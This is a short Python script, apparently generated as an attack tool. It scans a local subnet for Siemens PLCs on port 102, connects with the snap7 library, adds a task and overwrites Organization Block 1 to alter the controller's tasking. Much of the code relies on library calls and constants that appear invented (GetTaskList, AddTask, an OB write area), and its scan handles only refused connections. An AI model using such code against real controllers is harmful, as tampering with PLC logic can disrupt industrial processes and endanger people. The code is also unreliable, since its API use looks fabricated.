import socket
import random
import snap7

# Function to find the PLC's IP address
def find_plc_ip():
    # Assuming the PLC is on the same network as the Windows machine
    # and the subnet mask is 255.255.255.0
    for i in range(1, 255):
        ip = f"192.168.1.{i}"
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((ip, 102))
            client.close()
            return ip
        except ConnectionRefusedError:
            pass
    return None

# Function to modify controller tasking
def modify_controller_tasking(plc_ip):
    # Create a client object
    client = snap7.S7Client()

    # Connect to the PLC
    client.ConnectTo(plc_ip, 0, 1)

    # Get the current task list
    task_list = client.GetTaskList()

    # Print the current task list
    print(task_list)

    # Create a new task
    new_task = {
        'name': 'New Task',
        'interval': 100,
        'priority': 10,
        'program': 'New Program'
    }

    # Add the new task to the task list
    client.AddTask(new_task)

    # Get the updated task list
    updated_task_list = client.GetTaskList()

    # Print the updated task list
    print(updated_task_list)

    # Associate the new program with the task, Organization Block 1 (OB1)
    client.WriteArea(snap7.s7const.S7AreaOB, 1, 0, b'\x01')

    # Set the priority of the new task to high
    client.WriteArea(snap7.s7const.S7AreaOB, 1, 1, b'\x10')

    # Set the interval of the new task to 100ms
    client.WriteArea(snap7.s7const.S7AreaOB, 1, 2, b'\x64')

    # Disconnect from the PLC
    client.Disconnect()

# Main function
def main():
    plc_ip = find_plc_ip()
    if plc_ip:
        print(f"PLC IP address found: {plc_ip}")
        modify_controller_tasking(plc_ip)
    else:
        print("PLC IP address not found")

if __name__ == "__main__":
    main()